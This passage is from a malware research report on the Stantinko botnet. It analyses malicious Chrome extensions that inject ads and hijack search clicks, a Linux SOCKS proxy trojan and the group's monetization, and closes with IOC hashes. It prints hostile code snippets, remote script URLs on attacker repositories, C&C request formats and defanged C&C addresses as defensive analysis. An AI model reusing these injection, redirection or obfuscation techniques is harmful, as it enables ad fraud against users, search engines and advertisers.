[{‘type’:’img’,’img’:’hxxp://adhelper.org/\ncore/images/casino/b92cefcb819ab8cd2dd12beacdbfb3c1.\ngif’,’link’:’hxxp://777-gambling.org/?r=201’},{‘ty\npe’:’img’,’img’:’hxxp://adhelper.org/core/images/\ncasino/617956322121fa5d1848fad7353e2e42.gif’,’link’:’hxxp://777gambling.org/?r=201’},{‘type’:’img’,’img’:’hxxp://adhelper.\norg/core/images/casino/e167ca8368c59fd06def348ac16761b7.\ngif’,’link’:’hxxp://777-gambling.org/?r=201’}];\n[...]\nif (adv.type == ‘img’)\n{\n  banner.innerHTML = ‘<a href=”’ + adv.link + ‘” target=”_\nblank”><img src=”’ + adv.img + ‘” width=”’ + width + ‘” height=”’\n+ height + ‘”></a>’;\n}\nelse if (adv.type == ‘flash’)\n{\n  banner.innerHTML = adv.flash;\n}\n\n```\n\nFigure 73. Script injected in Mail.Ru pages\n\nThe script injected into VKontakte, a popular Russian social network, is slightly different. Not only\nit is able to inject ads into the page, but it also includes some additional JavaScript from another\nGitHub repository belonging to the user “Brenev”.\n\n```\njoin.src=”hxxps://raw.github.com/brenev/\ncollection/23e3b14ba4be09a2474cb87074722a18d2cac2e1/noAj.js”;\nbook.src = “hxxps://raw.github.com/brenev/\ncollection/730ef5cbcf76162890c187a8ce5693611ca0c6fd/noAj_book.\njs”;\nfact.src = “hxxps://raw.github.com/brenev/collection/\nbb1ee3dd7e2922eb328f282123596f18bd1d79dd/fActivity.js”;\nlikeUp.src = “hxxps://raw.github.com/brenev/collection/\nea973fe59ea7262d142cdf7ce8f9cab22fd66a70/likeUp.js”;\n\n```\n\nFigure 74. Script injected in VKontakte pages\n\nThese four files date back to 2014. Their purpose is to interact with VK by, for example, producing fake\n“likes”. However, due to the number of hardcoded values, we believe these files were only there\nto perform some tests.\n\nThe collection repository, pictured Figure 75, is really interesting as it contains more files.\nWe saw in Section 5.3.3 that the file index is the encrypted list of C&C servers for the search_\n```\nparser module. This suggests a strong link between the botnet usage as generic backdoor \n\n```\nand as adware.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\nFigure 75. Brenev/collection github repository\n\n###### 6.4.2. The Safe Surfing\n\nWe noticed that the APIHelper extension is not available on the Chrome Web Store. Moreover,\nas the NPAPI technology has been discontinued, APIHelper is no longer functional in modern\nbrowsers. Thus, the Stantinko developers created a new extension called The Safe Surfing. The final\npurpose is really similar — injecting ads — but it is disguised as an extension that is advertised\nas protecting the user from unsafe websites. This extension was released in November, 2015.\n\nLooking at the Chrome Web Store, we see that this extension has more than 450,000 users\nand a poor rating, just one star. Moreover, there are many comments saying that the extension\nwas installed without consent, which is true because Stantinko’s BEDS installs\nthis extension surreptitiously.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\nFigure 76. The Safe Surfing on the Chrome Web Store\n\nFigure 77. Bad comment for The Safe Surfing on the Chrome Web Store\n\n```\nI got this extension against my will and it was installed \nin all browsers I had. I deleted it but it reappeared again \nafter some time.\nI see nothing useful in this extension, it never did anything.\nNow I have suspicion that this extension can steal something.\n\n```\n\nFigure 78. Translation of the comment\n\nLike APIHelper, this extension downloads a configuration file from its C&C server: hxxp://api.\nsafesurfing.me/blacklist.php. However, the behavior is different if the extension was installed\nvia the Chrome Web Store or via the BEDS. If it was installed via the Store, the configuration file\nit receives looks legitimate:\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\n➊ A blacklist of “malicious” domains, according to the author of The Safe\n_Surfing. It does block them when a user tries to navigate to them with_\nthe extension installed.\n\n➋ This base64 content contains JavaScript that is injected in every page\nvisited by the user. It is used to parse the content of visited web sites,\nlooking for some Russian words. If it matches, it exfiltrates the URL\n[to a remote server. The script is provided in our GitHub repository.](https://github.com/eset/malware-ioc/tree/master/stantinko)\n\nFigure 79. Decrypted blacklist.php response\n\nWhile we know they are looking for Russian websites with subscriptions, it’s not clear to us what\nthe exact purpose is of gathering such links. We only know for sure that this behavior is unwanted\nand unadvertised to the user.\n\nWhen the extensions was installed by Stantinko’s BEDS, its local storage contains a user_id\nand a group_id key. These values follow the victim continuously after the initial compromise.\nWhen the extension retrieves the encrypted configuration from its server via a POST request\nto hxxp://api.safesurfing.me/blacklist.php, it sends both parameters.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\n➊ The same bot identifier shared between Stantinko’s components\n\n➋ This data is encrypted with RC4 using the uid as the key\n\nFigure 80. POST request to get the blacklist\n\nOnce decrypted, the data field contains these data:\n\n```\nplugin_version=4.18&extension_version=4.18&uid=\n<bot id>&group=<group id>\n\n```\n\nFigure 81. Decoded data field\n\nThe server returns an encrypted JSON, once again encrypted with RC4 using the uid as the key.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n```\n{\n  “ajax_substitution”: [\n    {\n      “domains”: [\n        “vk.com”,\n        “www.vk.com”,\n        “new.vk.com”,\n        “www.new.vk.com”\n      ],\n      “url_script”: “hxxps://raw.githubusercontent.com/\nkabanovmihail/static/master/master”\n    },\n    {\n      “domains”: [\n        “www.yandex.ru”,\n        “yandex.ru”,\n        “www.yandex.by”,\n        “yandex.by”,\n        “www.yandex.ua”,\n        “yandex.ua”,\n        “www.yandex.kz”,\n        “yandex.kz”,\n        “ya.ru”,\n        “www.ya.ru”\n      ],\n      “url_script”: “hxxps://raw.githubusercontent.com/\nshapovalovnikolayy/static/master/yamaster”\n    },\n    [...]\n    “dynamical_redirect”: {\n    “*.admixer.net/click?*”: {\n      “exclude”: [\n        “JCHbgehvf”\n      ],\n      “type”: 2\n    },\n    “*.adwolf.ru/*/goLink*”: {\n      “exclude”: [\n        “JCHbgehvf”\n      ],\n      “type”: 2\n    },\n    [...]\n    “safe_surfing_bad_sites”: [\n    “1000video.club”,\n    “100adbum.sade.pp.ua”,\n    “100gigabit.co”,\n\n```\n\nFigure 82. The Safe Surfing malicious configuration\n\nThis extension works exactly like APIHelper. It registers callbacks for onBeforeNavigate\nand DOMContentLoaded. The Native Client (NaCl) binary [12], safe_surfing_*.nexe, is used\nto check the URLs against the configuration and provide a redirection or a script to inject. However,\nthe sneaky part is that the same functions are used to block the unwanted websites of the blacklist\nand to redirect the user.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\n➊ Call the NaCl binary. It is called to check the URL against the blacklist\nbut also against the dynamical_redirect rules.\n\n➋ It changes the URL of the tab. If it matches the blacklist, it will be redirected\nto a benign alert page.\n\n➋ If the URL matches the blacklist, alert is returned. If it is empty,\nit did not match any rules. If it contains a URL, it matches an ad-related\nredirection.\n\nFigure 83. Callback on the event onNavigateListener\n\nFor the injection of the scripts, the same technique is used. Rather than injecting the subscription\nchecker script, it will add the malicious script only if the URL matches one of the rules. The injected\nscripts are slightly different from those of APIHelper. They still inject ads into webpages, as shown\nin Figure 84, but they also replace links in some search engines such as those run by Mail.Ru,\nRambler, and Yandex.\n\nFigure 84. Injection of ads on the rambler.ru website\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\nIn Figure 84 the top banner and the right banner (surrounded in black) have been replaced\nby Stantinko.\n\nTo redirect the victims when they click on a link, Stantinko selects all the links that match certain\nhardcoded CSS properties. Then, it adds a callback to the onClick event on all of them. It will check\nthe link against the configuration and redirect the user if it deemed appropriate. Thus, they are able\nto earn money from searches while not owning any search engine. The targeted search engines lose\nincome in this scheme because they will never receive money for providing traffic to the advertisers.\nA snippet of the code responsible for this behavior is provided Figure 85.\n```\n        prepareLinks: function() {\n            b.getLinks();\n            for (var a in b._links) b._links.hasOwnProperty(a) &&\n        (b._links[a].element.setAttribute(b._index_attribute, a),\n        b._links[a].element.onclick = b.linkClickHandler, window.\n        postMessage({ ➊\n                from: “safe_surfing”,\n                method: “get_safe_url”, ➋\n                index: a,\n                source_url: “http://google.ru/url?url=” + b._\n\n```\n`links[a].url +` `“&usg=mail”` ➌\n```\n            },\n            “*”))\n        },\n        linkClickHandler: function(a) {\n            if (!this.getAttribute) return !0;\n            var e = this.getAttribute(b._index_attribute) || null;\n            if (null === e || !b._links[e]) return !0;\n            window.open(b._links[e].url); ➍\n            b.stopEvent(a);\n            return !1\n        },\n\n```\n➊ Register a callback for the onClick event.\n\n➋ Call to the NaCl binary. It uses the same function that is normally used\nto “protect” the user.\n\n➌ Even if Google is not targeted by the extension, they put all the URLs\nin this format.\n\n➍ Redirect the user if needed.\n\nFigure 85. Redirection on click\n\nA summary of the redirection process when on click is made is shown Figure 86.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\nThe user clicks\non a search result.\n\nFigure 86. Redirection process\n\n\nThe user is finally redirected\nto the landing page of those\nwho paid GoLinks for the visit.\n\n\nFinally, all the pictures used for the ads are stored in GitHub repositories. We provide a list of such\nrepositories in Appendix A.\n\nIf this extension is analyzed without context, it looks legitimate. It turns out that they built it only\nto hide their malicious activity, which seems quite a lot of effort. Moreover, even if the machine was\ncleaned from the other Stantinko components, this extension can survive as long as the user_id\nand the group_id are in the local storage of the application.\n\nIt is difficult to estimate its number of malicious installations, but we believe this can be one\nof the most profitable frauds performed by this botnet.\n\n###### 6.4.3. Teddy Protection\n\nThis is the Stantinko group’s more recent Chrome extension, and its first version was released\nin November 2016. It is currently distributed in parallel with The Safe Surfing. It is advertised as a parental\ncontrol filter and ad blocker. However, the ultimate goal is to redirect users to advertising pages,\nexactly like APIHelper and The Safe Surfing. Teddy Protection has a twin browser extension named Teddy\n_Protection Lite, which has the same behavior._\n\nAccording to the Chrome Web Store, almost 500,000 users have this extension installed.\nThere are only around 1,600 ratings and several reviews complain that the extension appeared\nin their browser “automatically”.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\nFigure 87. Teddy Protection extension on the Chrome Web Store\n\nThe malicious behavior is also hidden in the code responsible for protecting the user. Without\nthe uid and group_id, the application will play its protective role. It even has a functional interface\nas shown in Figure 88.\n\nFigure 88. Teddy Protection administrative page\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\nOnce the extension is installed, it will ask its C&C server for a blacklist. The reply is base64-encoded\nand compressed with zlib.\n\n```\nPOST / HTTP/1.1\nHost: update.teddy-protection.com\nConnection: keep-alive\nContent-Length: 32\nOrigin: chrome-extension://mofelbkemhligelpmjmohgphhmogbkni\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64)\nAppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133\nSafari/537.36\nContent-Type: application/x-www-form-urlencoded\nAccept: */*\nAccept-Encoding: gzip, deflate\nAccept-Language: en-GB,en-US;q=0.8,en;q=0.6\ncrc=0&target=blist&version=2.5.1\n\n```\n\nFigure 89. Request for a blacklist update\n\n```\n[265602775,2250089375,3030333628,3908397889,2781648926,1096236512\n,3492530058,3522785878,2495119239,3017225421,1181540589,140492156\n2,1324749345,1446406747,4083038945,3146070714,2149979289,10538490\n52,1378802204,2406466969,558340953,1398149158,2965616510,...]\n\n```\n\nFigure 90. Decompressed reply\n\nThe reply is a list of CRC32 checksums. Each time the user visits a website, the extension computes\nthe checksum of the domain and checks it against the blacklist. If it is in the blacklist, the user\nis redirected to a non-malicious block page.\n\nHowever, if the extension was installed by Stantinko, the fields uid and group of its local storage\nare set. In that case, the extension will also ask for an AList (possibly stands for Advertising List).\nThe reply is also base64-encoded and compressed with zlib.\n\n```\nPOST / HTTP/1.1\nHost: update.teddy-protection.com\nConnection: keep-alive\nContent-Length: 98\nOrigin: chrome-extension://mofelbkemhligelpmjmohgphhmogbkni\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64)\nAppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133\nSafari/537.36\nContent-Type: application/x-www-form-urlencoded\nAccept: */*\nAccept-Encoding: gzip, deflate\nAccept-Language: en-GB,en-US;q=0.8,en;q=0.6\ncrc=2745614147&group=1000_85632192&target=alist&uid=b57f19c56d\n9db4348e082cb34c3406e5&version=2.5.1\n\n```\n\nFigure 91. Request for an AList\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\n➊ Redirection URL. The same domain was used in the APIHelper and The Safe\n_Surfing configurations._\n\n➋ Global exclusions. Letters are replaced by a custom checksum that\nis described below. For example 6E9C77F06 corresponds to the string\n```\n  utmzi.\n\n```\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\n➌ Value used in the custom checksum algorithm.\n\n➍ Regex for a domain name. The letters are again replaced\nby their checksum. This one corresponds to the string google.\n\n➎ List of excluded domains.\n\nFigure 92. Decompressed reply\n\nUnlike the previous extensions, the configuration of Teddy Protection does not contain the targeted\ndomains, but only regular expressions with letters and digits replaced by a checksum. Thus, it is not\npossible to reverse the operation and get the full list of domains. To have an idea about what the list\ncontains, we computed the checksums from a list of known domains with the custom algorithm.\nWe found that Google, Mail.Ru, Yandex and Rambler are among the targets.\n\nLike the other extensions, it has a callback on the BeforeNavigate event and checks, each time,\nthe domain against the AList. However, it first converts the domain using the custom checksum\nso it can be matched against the regular expressions of the configuration. The conversion function\nis given in Figure 93.\n```\n        function convert(domain, shift, initial_timestamp) { ➊\n          var c = “”,\n          e = “”;\n          if (domain) {\n            --initial_timestamp;\n            for (var f = 0, h = domain.length; f < h; f++) { ➋\n              var g = domain.charCodeAt(f);\n              if(65 <= g && 90 >= g || 97 <= g && 122 >= g) { ➌\n                e += String.fromCharCode(g - (shift + Math.\n                ceil((Utils.date.getCurrentTimestamp(!0)                 initial_timestamp) / 100))) ➍\n              }\n              else{ ➎\n                (e && (e = Utils.crypt.sha1(e), c += e.substr\n                (parseInt(e[0], 16), 10 - Math.ceil(parseInt(e[39], \n                16) / 4)).toUpperCase(), e = “”), c += a[f]) ➏\n              }\n            }\n            e && (e = Utils.crypt.sha1(e), c += e.substr(parseInt(e[0], \n            16), 10 - Math.ceil(parseInt(e[39], 16) / 4)).toUpperCase())\n          }\n          return c ➐\n        }\n\n```\n➊ The domain name, the shift parameter of the configuration\nand a timestamp.\n\n➋ Iterates over all the characters of the domain string.\n\n➌ If the characters is a letter ([a-zA-Z]).\n\n➍ The buffer e is concatenated with a character computed from the current\ncharacter, the shift and the difference between the two timestamps.\nThe getCurrentTimestamp function returns the current timestamp\nin seconds. However, Math.ceil((getCurrentTimestamp(!0) ```\n       initial_timestamp) / 100) always returns 1 if the difference is less\n\n```\nthan 100 seconds. This might be an anti-debug trick as the checksum\nwill be different if it took more than 100 seconds to compute.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\n➎ If it is a special character like “-” or “.” for example.\n\n➏ The final string c is concatenated with some characters from the SHA-1\nhash of the buffer e.\n\n➐ Return the modified string. For example, eset.com becomes\n```\n       05F2DEBC7.55D2398E68\n\n```\nFigure 93. Domain conversion algorithm\n\nFinally, if a domain matches a rule in the configuration, the user will be redirected to the URL\nprovided by the configuration, hxxp://clk.golinks.org/?r={%data%}&ref={%data%}\n```\n&source=tdp. {%data} will be replaced by the URL entered by the user and encoded in base64.\n\n```\nThus, this extension has the same goal as the previous ones, but its authors have put even much\nmore effort to hide the fact that it can redirect the user to advertisement-related websites.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\n##### 7. LINUX TROJAN PROXY\n\nStantinko mainly relies on Windows executables to perform its malicious operations. However,\nthey also deploy Linux binaries on compromised servers. We believe they found these servers using\nthe brute-force module. At the time of writing, we have discovered only a SOCKS proxy.\n\nIt is a 64-bits ELF binary with debugging symbols. This malware has three main functions:\nit can send info, receive additional files and run a SOCKS proxy.\n\n###### 7.1. In The Wild\n\n[On VirusTotal, we found the dump of a Joomla website that contained this Trojan Proxy in the folder](https://www.virustotal.com/en/file/df52d0439e4e6a7b7a978a4b3babe7d4e330aab03f6aff041c869bfe503dabf3/analysis/)\n```\nimage under the name mysql. According to the timestamp of the file in the ZIP archive, the malware\n\n```\nwas dropped on August, 31 2016.\n\nInterestingly, the dump also contains Joomla logs. We noticed that between August, 22 2016 and\nAugust, 23 2016, 12,563 login attempts failed. Thus, this was probably the result of the brute-force\nplugin used by Stantinko.\n\n###### 7.2. Analysis\n\nWhen launched, the malware begins by sending fingerprint information to one of its C&C servers:\n```\n185.28.22[.]22:81 and 195.226.218[.]234:80. The first one is also used by several \n\n```\n_PDS modules. The report sent to the C&C server is provided in Figure 94._\n```\n        NOTIFY\n\n```\n`Sp: %d` ➊\n`V: %s` ➋\n`Cwd: %s` ➌\n`Name: %s` ➍\n`UID: %s` ➎\n`Restarted: %d` ➏\n`RestartCount: %d` ➐\n`Sysname: %s` ➑\n`Nodename: %s` ➑\n`Release: %s` ➑\n`Version: %s` ➑\n`Machine: %s` ➑\n```\n        \\r\\n\n\n```\n➊ Socks proxy listening port. Default is 8087.\n\n➋ Version (hardcoded, 1.293)\n\n➌ File path\n\n➍ Filename\n\n➎ Server uid (hardcoded, 81ccfbb56e82197c65d0153bb9836d33)\n\n➏ Has the malware been restarted? (0 or 1)\n\n➐ Number of restarts of the malware\n\n➑ Extracted from uname()\n\nFigure 94. Report sent to the C&C server\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\nThe first byte of the reply can be either 0, 2 or 3. These mean, respectively, no action, update\nPHP files, and self-update the binary. The PHP files to update and the malware update are also\ncontained in the reply data. Then, the malware will sleep thirty minutes before making another\nrequest to its C&C server. As of time of writing, we have been unable to find the PHP files dropped\nby this sample.\n\nImmediately after being launched in memory, the malware’s executable file is deleted from disk.\nThus, the samples can only be found in memory or in network traces, making it more difficult\nfor researchers to track them.\n\nFinally, some information is logged in a file called <binary filename>.output. For instance,\nit contains the server uid and the proxy port.\n\nThe other functionality of this malware is an open proxy. This is a regular SOCKS5 proxy.\n\nBy default, it listens on port 8087 but if it is already in use, it opens a random port higher than 10000.\nIt then waits for incoming connections. The credentials are hardcoded in the binary and checked\nat each connection. The username is scan4you.\n\nScan4you is a service similar to VirusTotal, but offering anonymity to the criminal underworld.\nIt can check a sample against multiple security products to see if it’s detected without sending\nit to the security companies. It is possible the proxies are used to submit samples to Scan4you.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\n##### 8. MONETIZATION\n\nIn the previous sections, we covered the technical characteristics of multiple Stantinko components.\nIn this section, we will explain how Stantinko’s operators monetize such a big botnet.\n\n###### 8.1. Click Fraud\n\nClick fraud, including ad injection, is a growing concern for the online industry. According to a join\nreport from White Ops and the Association of National Advertisers (ANA) [2], it is estimated that click\nfraud will cost $6.5 billion in 2017.\n\nAmong the multiple forms of ad fraud, Stantinko chose to perform ad injection using malicious\nbrowser extensions, as detailed in Section 6.4. It is not a new technique, but it is still really effective\nand a lot more difficult to catch than generating totally fake views or clicks, as we detailed for FileTour\nin Section 3.3.3. Basically, it consists of using the browser to replace or inject ads in a third-party\nwebsite. Thus, the gang behind the malware earns money for displaying their ads on websites\nbelonging to someone else. More generally, this type of fraud can be done on the client side, using\na HTTP proxy or a browser extension, or by man-in-the-middling the Internet connection, for example\non a free Wi-Fi hotspot.\n\nIn 2015, Google researchers published a comprehensive study on ad injection [3]. In particular they\nconcluded that ad injection was impacting 5% of IP addresses accessing Google websites — tens\nof millions users. It shows that this kind of fraud is really profitable and explains why Stantinko’s\noperators chose to use it.\n\nThe two Stantinko malicious browser extensions, The Safe Surfing and Teddy Protection, have around\n500,000 users. However, it is difficult to estimate the amount of money they make through\nthis fraud. On one hand, we do not know how many times the victims browse the websites that\nStantinko targets. On the other hand, we do not know at what price the malicious actors are able\nto sell their fraudulent traffic.\n\nUnlike the majority of click-fraud malware families that rely on long redirection chains to launder\nthe malicious traffic, Stantinko is able to reach the publishers after only one or two hops. Moreover,\nthe first hop, including 777-gambling[.]org, golinks[.]org or adhelper[.]org, probably\nbelongs to the same group. They all resolve to the same IP addresses and a JavaScript file hosted\non adhelper[.]org includes other scripts from brenev’s GitHub repository. This GitHub account\nis also used for other Stantinko activities, as it was described in Section 5.3.3. These really short\npaths of redirection mean they are really integrated into the advertising market and even have direct\nrelationships with some publishers. Thus, they are probably able to sell the generated traffic at a higher\nprice, as if they were legitimate visits.\n\nFinally, their way to replace ads or redirect the user is very subtle. They do not fill the pages\nwith advertisements; they only replace the existing ones with their own. Thus, it may not be noticed\nby the user and the advertisers will receive a traffic of “good quality”, because the user initially clicked\non an advertisement.\n\n###### 8.2. Compromised Websites\n\nIn the Section 5.3.4, we detailed how Stantinko is able to compromise websites automatically\n[based on the Joomla and WordPress Content Management Systems. Rather than exploiting](https://www.joomla.org/)\nknown vulnerabilities, they brute-force administration credentials using tens of thousands of bots\nat the same time. We have recently seen other malware, such as Sathurbot [8], using the same\ntype of attack.\n\nWe have no evidence of how all these compromised websites are used once credentials are found.\nCompromised Joomla and WordPress websites can be easily resold on the black market. In 2016,\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\nKaspersky researchers described an underground market called xDedic [4]. They found that\na compromised server can be sold for $6. It is low but, it can be highly profitable if they are able\nto compromise a large number of websites each day.\n\nOnce sold, the compromised websites can be used, for example, to host illegal content or to deliver\nmalware by redirecting visitors to exploit kits. The latter case has been widely analyzed. An example\nis the EITest campaign [7]. In that article, the authors found that the first stage of the infection\nhappens on compromised websites. Joomla and WordPress sites accounted for more than 60%\nof the websites used to redirect to the EITest gate. It shows that a market exists for compromised\nWordPress and Joomla websites.\n\nMoreover, we have seen that another PDS plugin, the search parser, uses compromised Joomla\nwebsites as C&C servers. Thus, they may also use the brute-force plugin to update their list\nof C&C servers.\n\nTo conclude, Stantinko may also participate in the market of compromised websites that later\ncan be used for other malicious activities.\n\n###### 8.3. Social Network Fraud\n\nIn the Section 5.3.5, we analyzed a plugin that performs social media fraud on Facebook, including\nliking pages or pictures.\n\nSeveral research efforts have already been made on malware that is able to interact with social\nnetworks. In 2016, Gosecure researchers published an analysis of the ecosystem behind Linux/\nMoose [6]. They were able to identify the underground markets behind the reselling of likes\nand, in particular, they found prices for Instagram followers. They were on average $15.98\nfor 1,000 followers, $19.54 for 1,000 likes and $72.25 for 100 comments. The prices for Facebook\nseem very similar, as shown in the Figure 95.\n\nFigure 95. Cost of buying Facebook likes\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\nThis type of monetization requires a lot of different machines being as stealthy as possible. Stantinko\nmeets these requirements, as their malware is difficult to collect and is able to remain on the victimized\ncomputers for a long period of time. The size of the botnet, estimated at half a million machines,\nis also a strong advantage. It allows them to distribute the fraud across so many computers that\nit becomes really difficult to detect.\n\nHowever, we have not seen this module being widely distributed in 2017. The underground market\nfor this type of fraud does exist, and because of the relatively low volume of botnets able to perform\nsocial media fraud efficiently, we believe it could have been an important revenue stream in the past\nfor the Stantinko operators.\n\n###### 8.4. Compromised Machines\n\nIn Section 5.3.6, we detailed the remote administrator plugin. It is a typical backdoor that allows\nthe attacker to control the compromised machines remotely. There are multiple ways to monetize\nthis plugin: the machine is totally under the control of the Stantinko botnet operators. As the final\npurpose of this plugin remains obscure, we provide here some insights on the typical ways\nto monetize a backdoor.\n\nOn one hand, this plugin could be used to spy on the victim, as it has the ability to exfiltrate files\nto its C&C server. Generally this approach is used to steal: (a) identity-related documents, (b) banking\ncredentials or (c) confidential documents.\n\nThe two first approaches are a typical modus-operandi for crimeware. There are channels on the black\nmarket to sell this kind of data. In 2015, McAfee researchers published a report in which they claim\na stolen US credit card number can be sold for $5 to $8 [9]. For a US credit card number and all the\ninformation about the owner, the price goes up to $30. Even if gangs doing bank fraud generally use\nmalware dedicated to this task, it is possible that Stantinko is also used to steal banking credentials\nas a side revenue.\n\nThe third approach is to use a large crimeware botnet to conduct espionage. Among the hundreds\nof thousands of infected machines, there are probably valuable targets, on which it would be possible\nto find interesting documents, that could be resold to government agencies. However, we have\nnot observed Stantinko being used in this manner in the wild.\n\nOn the other hand, a botnet this large can be rented out to perform any kind of malicious activity\nincluding mining cryptocurrency or conducting Distributed Denial of Service attacks. In a blogpost\nreleased in 2013, Webroot’s researchers said that a thousand nodes US-based botnet can be rented\nfor as low as $200 [10]. However, the main characteristic of the Stantinko group is the ability of their\nsoftware to remain really furtive. Thus, they probably do not perform tasks requiring high CPU usage\non the infected machines — to do so could alert the user.\n\nThus, this plugin is probably only used for small operations to conduct tests or to earn side revenues,\nas their main revenue channels seems to be the ad injections, and the compromise of Joomla\nand WordPress websites.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\n##### 9. CONCLUSION\n\nStantinko has been able to stay under the radar for a number of reasons:\n\n- By hiding their code in kilobytes of legitimate code, the files look benign at first sight.\nThe malicious parts only come to light by means of thorough analysis.\n\n- In some modules, the malicious code is stored in the Windows Registry, which makes\nit difficult to collect and analyze.\n\n- The persistent malicious code’s sole purpose is to download and execute in memory only.\nThus, it’s very difficult to find the botnet’s raison d’être without active tracking.\n\nMonetization by injecting ads in browsers seems to be the principal goal of the gang behind\nStantinko. Although this malware family could be classified as adware for that reason, let’s not forget\nthat it is essentially a backdoor that could be used for any number of malicious purposes. This isn’t\npurely hypothetical: Stantinko was also used to proxy Internet traffic in order to perform Internet\nsearches to find websites they can compromise, deploy social network bots, and gain full control\nvia remote administration software.\n\nWe hope this report will raise awareness and help victims clean up their systems. Hopefully there\nare enough details in our research to identify the past, current and future campaigns of this group.\nAnalysts should now have the tools to detect and clean systems of Stantinko.\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\n##### 10. BIBLIOGRAPHY\n\n_1._ J. Calvet, “Boaxxe adware: ‘A good ad sells the product without drawing attention to itself’”, 2014. Online:\n\n[https://www.welivesecurity.com/2014/01/14/boaxxe-adware-a-good-ad-sells-the-product-without-drawing-](https://www.welivesecurity.com/2014/01/14/boaxxe-adware-a-good-ad-sells-the-product-without-drawing-attention-to-itself-pt-1/)\n[attention-to-itself-pt-1/](https://www.welivesecurity.com/2014/01/14/boaxxe-adware-a-good-ad-sells-the-product-without-drawing-attention-to-itself-pt-1/)\n\n_2._ [ANA - White OPS, “The Bot Baseline - Fraud in Digital Advertising”, 2017. Online: https://www.ana.net/getfile/25093](https://www.ana.net/getfile/25093)\n\n_3._ K. Thomas, E. Bursztein, C. Grier, G. Ho, N. Jagpal, A. Kapravelos, D. McCoy, A. Nappa, V. Paxson, P. Pearce, N.\nProvos, and M. A. Rajab, “Ad injection at scale: Assessing deceptive advertisement modifications”, in Proceedings\nof the IEEE Symposium on Security and Privacy, 2015. Online:\n[https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/43346.pdf](https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/43346.pdf)\n\n_4._ GReAT, “xDedic – the shady world of hacked servers for sale”, 2016. Online:\n\n[https://securelist.com/blog/research/75027/xdedic-the-shady-world-of-hacked-servers-for-sale/](https://securelist.com/blog/research/75027/xdedic-the-shady-world-of-hacked-servers-for-sale/)\n\n_5. O. Bilodeau and T. Dupuy, “Dissecting Linux/Moose”, 2015. Online:_\n\n[https://www.welivesecurity.com/wp-content/uploads/2015/05/Dissecting-LinuxMoose.pdf](https://www.welivesecurity.com/wp-content/uploads/2015/05/Dissecting-LinuxMoose.pdf)\n\n_6._ [M. Paquet-Clouston, O. Bilodeau, D. Décary-Hétu and T. Dupuy, “EGO Market”, 2016. Online: https://gosecure.net/](https://gosecure.net/wp-content/uploads/2016/11/Ego-Market_When-Greed-for-Fame-Benefits-Large-Scale-Botnets.pdf)\n[wp-content/uploads/2016/11/Ego-Market_When-Greed-for-Fame-Benefits-Large-Scale-Botnets.pdf](https://gosecure.net/wp-content/uploads/2016/11/Ego-Market_When-Greed-for-Fame-Benefits-Large-Scale-Botnets.pdf)\n\n_7._ [“Exposing EITest campaign”, 2017. Online: https://blog.brillantit.com/exposing-eitest-campaign/](https://blog.brillantit.com/exposing-eitest-campaign/)\n\n_8._ ESET Research, “Sathurbot: Distributed WordPress password attack”, 2017. Online:\n\n[https://www.welivesecurity.com/2017/04/06/sathurbot-distributed-wordpress-password-attack/](https://www.welivesecurity.com/2017/04/06/sathurbot-distributed-wordpress-password-attack/)\n\n_9._ McAfee, “The Hidden Data Economy”, 2015. Online:\n\n[https://www.mcafee.com/us/resources/reports/rp-hidden-data-economy.pdf](https://www.mcafee.com/us/resources/reports/rp-hidden-data-economy.pdf)\n\n_10._ Webroot, “New underground service offers access to thousands of malware-infected hosts”, 2013. Online:\n\n[https://www.webroot.com/blog/2013/02/12/new-underground-service-offers-access-to-thousands-of-malware-](https://www.webroot.com/blog/2013/02/12/new-underground-service-offers-access-to-thousands-of-malware-infected-hosts/)\n[infected-hosts/](https://www.webroot.com/blog/2013/02/12/new-underground-service-offers-access-to-thousands-of-malware-infected-hosts/)\n\n_11._ T László and Á Kiss, “Obfuscating C++ Programs via Control Flow Flattening”, 2009. Online:\n\n[https://www.inf.u-szeged.hu/~akiss/pub/pdf/laszlo_obfuscating.pdf](https://www.inf.u-szeged.hu/~akiss/pub/pdf/laszlo_obfuscating.pdf)\n\n_12._ [Google, “Welcome to Native Client”. Online: https://developer.chrome.com/native-client](https://developer.chrome.com/native-client)\n\n\n-----\n\n##### Stantinko Teddy Bear Surfing Out of Sight\n\n\n##### APPENDIX A: IOCS\n\n###### A.1. Samples\n\nAPIHelper.dll\n```\n   84A055D8E4BDF1F140C4DCA3D2D7738027E07115\n\n```\nAPIHelper_64.dll\n```\n   BCBC28219D47097FBCE312DA450B84079689A0BF\n\n```\nbhctrl32.exe\n```\n   125CEDE073FC3578C9D4C92A858B92C6D551BB0E\n   A2956B05909E48F82F6FC9A690A64D4F0B2A61C8\n   